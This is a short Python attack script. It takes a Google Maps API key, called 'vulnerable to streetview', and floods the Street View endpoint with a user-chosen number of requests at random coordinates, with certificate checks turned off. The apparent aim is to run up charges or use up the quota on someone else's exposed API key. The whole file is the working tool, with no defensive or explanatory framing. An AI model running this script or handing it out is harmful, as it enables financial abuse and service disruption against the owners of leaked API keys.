#!/usr/bin/python3
import requests, warnings, json, sys, os, random, colorama
from colorama import Fore
requests.packages.urllib3.disable_warnings()
colorama.init(autoreset=True)

def generate_url(apikey):
    lat_a = random.randrange(-90,90)
    lat_b = random.randrange(0,100000)
    lng_a = random.randrange(-90,90)
    lng_b = random.randrange(0,100000)
    return f"https://maps.googleapis.com/maps/api/streetview?size=400x400&location={lat_a}.{lat_b},{lng_a}.{lng_b}&fov=90&heading=235&pitch=10&key={apikey}"

def do_attack():
    apikey = str(input("Enter Google Maps API Key that vulnerable to streetview: "))
    count = int(input("Enter packet count: "))
    print (Fore.GREEN + "[+] Sending Packets")
    for i in range(count):
        url = generate_url(apikey)
        response = requests.get(url, verify=False)
        if response.status_code == 200:
            print(Fore.GREEN + f"[+] Packet sequence-{i+1} Succeed: {response.status_code}")
        else:
            print(Fore.RED + f"[-] Packet sequence-{i+1} Failed: {response.status_code}")

if __name__ == "__main__":
    do_attack()

